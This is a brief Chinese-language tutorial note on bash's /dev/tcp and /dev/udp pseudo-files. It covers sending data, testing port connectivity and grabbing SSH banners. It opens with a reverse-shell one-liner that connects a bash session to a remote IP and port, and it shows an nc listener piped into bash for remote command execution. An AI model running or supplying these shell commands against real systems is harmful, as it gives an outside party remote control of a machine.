# /dev/tpc/host/port 文件

> reverse shell
>
> ```
> bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
> ```

虽然看起来像一个文件，但是实际并不存在。如果是一个合法的规则，bash(==这是bash特有的，所以zsh使用时会报错==)会尝试打开相关的tpc socket。同样的还有`/dev/udp/host/port`

我们在A使用nc监听10086端口，B创建文件主动连接

```
#A
root in /etc/ssh λ nc -lk -p 10086 | bash

#B
┌─────( root)─────(/etc) 
 └> $ echo "ls"  > /dev/tcp/8.135.0.171/10086

#A显示
root in /etc/ssh λ nc -lk -p 10086 | bash
moduli          sshd_config       ssh_host_dsa_key.pub    ssh_host_ed25519_key      ssh_host_rsa_key.pub
ssh_config      sshd_config.bak   ssh_host_ecdsa_key      ssh_host_ed25519_key.pub  ssh_import_id
ssh_config.bak  ssh_host_dsa_key  ssh_host_ecdsa_key.pub  ssh_host_rsa_key
```

也可以用来发送请求

```
┌─────( root)─────(/etc) 
 └> $ printf GET HTTP 1.1 /r/n'  > /dev/tcp/baidu.com/443

---

root in /opt λ tcpdump -i eth0 host baidu.com
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
18:21:03.819749 IP 192.168.80.200.55266 > 39.156.69.79.https: Flags [S], seq 1888363027, win 64240, options [mss 1460,sackOK,TS val 1940856432 ecr 0,nop,wscale 7], length 0
```

==结合timeout来测试连通性==

```
 ┌─────( root)─────(~) 
 └> $ timeout --preserve-status 1 echo > /dev/tcp/baidu.com/443;echo $?
0

 ┌─────( root)─────(~) 
 └> $ timeout --preserve-status 1 echo > /dev/tcp/baidu.com/999;echo $?
bash: connect: Connection refused
bash: /dev/tcp/baidu.com/999: Connection refused
1
```

SSH版本探测

```
[root@8d3d229c-4aab-4812-96b9-37c8bc47a1d8 ~]#  cat  < /dev/tcp/8.135.0.171/22
SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
```

